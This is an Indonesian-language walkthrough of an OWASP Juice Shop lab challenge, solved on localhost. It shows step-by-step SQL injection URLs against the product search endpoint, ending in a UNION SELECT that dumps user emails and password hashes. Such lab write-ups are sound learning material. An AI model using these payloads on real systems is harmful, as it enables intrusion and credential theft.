# User Credential
Pada tantangan ini, tujuan kita adalah memperoleh daftar yang berisi seluruh kredensial pengguna dengan teknik SQL Injection. Celah yang dipakai masih sama seperti yang sudah dimanfaatkan pada challenge ke-4.
Endpoint yang digunakan juga mirip dengan sebelumnya, yaitu `/rest/products/search?q=`. Hanya saja, kali ini kita menyisipkan perintah `UNION SELECT` yang telah dimodifikasi agar bisa menarik data langsung dari tabel pengguna, menggantikan payload `sqlite_manage`.

## Referensi

[Juice Shop – Injection Challenge](https://juice-shop.herokuapp.com/#/score-board?categories=Injection&showDisabledChallenges=false)

## Bukti Pengerjaan

<img width="1919" height="962" alt="Screenshot 2025-09-11 141743" src="https://github.com/user-attachments/assets/08492737-9d58-4456-8c35-2d38dde5a198" />

### Langkah-langkah

<img width="442" height="188" alt="Screenshot 2025-09-11 131530" src="https://github.com/user-attachments/assets/f8770188-3423-4f9b-8611-f6e5dcfe47a3" />

1. Pada challenge ini kita diminta mengekstrak **daftar kredensial pengguna** dengan memanfaatkan celah SQL Injection.

   ```sh
   http://localhost:3000/rest/products/search?q='
   ```

2. Endpoint pencarian lebih mudah dieksploitasi dibandingkan form login, sehingga kita gunakan parameter `q` untuk injection.

   ```sh
   http://localhost:3000/rest/products/search?q=')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--
   ```

   <img width="1919" height="964" alt="Screenshot 2025-09-11 141803" src="https://github.com/user-attachments/assets/bcc6b349-0e93-448d-a54a-a58f505ae1bf" />

3. Setelah terhubung, kita lakukan `UNION SELECT` untuk mengambil data dari tabel users.

   ```sh
   http://localhost:3000/rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
   ```

   <img width="1919" height="962" alt="Screenshot 2025-09-11 141743" src="https://github.com/user-attachments/assets/1541f0c6-ea6f-4f3a-88f2-334a6fb84f81" />

4. Dengan mengganti kolom dummy menjadi kolom asli dari skema database (seperti `email` dan `password`), daftar kredensial user berhasil ditampilkan.
